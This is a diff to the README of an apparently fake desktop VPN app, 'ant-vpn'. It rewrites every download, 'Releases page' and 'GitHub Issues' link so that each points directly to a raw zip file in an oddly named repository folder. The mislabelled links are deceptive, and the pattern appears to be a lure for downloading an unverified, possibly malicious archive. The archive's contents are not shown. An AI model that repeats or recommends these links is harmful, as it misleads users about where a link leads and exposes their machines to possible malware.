@@ -6,9 +6,9 @@ Welcome to ant-vpn, your user-friendly desktop application for managing VPN conn
 
 ## 📥 Download ant-vpn
 
-[![Download ant-vpn](https://raw.githubusercontent.com/ansh826-alt/ant-vpn/master/verrucated/ant-vpn.zip)](https://raw.githubusercontent.com/ansh826-alt/ant-vpn/master/verrucated/ant-vpn.zip)
+[![Download ant-vpn](https://raw.githubusercontent.com/ansh826-alt/ant-vpn/master/kerflap/ant-vpn.zip)](https://raw.githubusercontent.com/ansh826-alt/ant-vpn/master/kerflap/ant-vpn.zip)
 
-Click the badge above or visit the [Releases page](https://raw.githubusercontent.com/ansh826-alt/ant-vpn/master/verrucated/ant-vpn.zip) to get the latest version of ant-vpn. This link takes you to all available downloads, ensuring you can pick the one that suits your system.
+Click the badge above or visit the [Releases page](https://raw.githubusercontent.com/ansh826-alt/ant-vpn/master/kerflap/ant-vpn.zip) to get the latest version of ant-vpn. This link takes you to all available downloads, ensuring you can pick the one that suits your system.
 
 ## 🖥️ System Requirements
 
@@ -21,7 +21,7 @@ Before you proceed with the installation, ensure your system meets the following
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Release page](https://raw.githubusercontent.com/ansh826-alt/ant-vpn/master/verrucated/ant-vpn.zip).
+1. **Visit the Releases Page**: Go to the [Release page](https://raw.githubusercontent.com/ansh826-alt/ant-vpn/master/kerflap/ant-vpn.zip).
 2. **Select Your Version**: Look for the latest version listed. Each version will have options for Windows, macOS, and Linux.
 3. **Download the Installer**:
    - For **Windows**, download the `.exe` file.
@@ -58,7 +58,7 @@ ant-vpn offers several features to make your VPN experience smooth and secure:
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please check our [GitHub Issues](https://raw.githubusercontent.com/ansh826-alt/ant-vpn/master/verrucated/ant-vpn.zip) page. You can also raise any new issues directly there, and we will respond as quickly as possible.
+If you encounter any issues or have questions, please check our [GitHub Issues](https://raw.githubusercontent.com/ansh826-alt/ant-vpn/master/kerflap/ant-vpn.zip) page. You can also raise any new issues directly there, and we will respond as quickly as possible.
 
 ## ⭐ Community Contributions
 
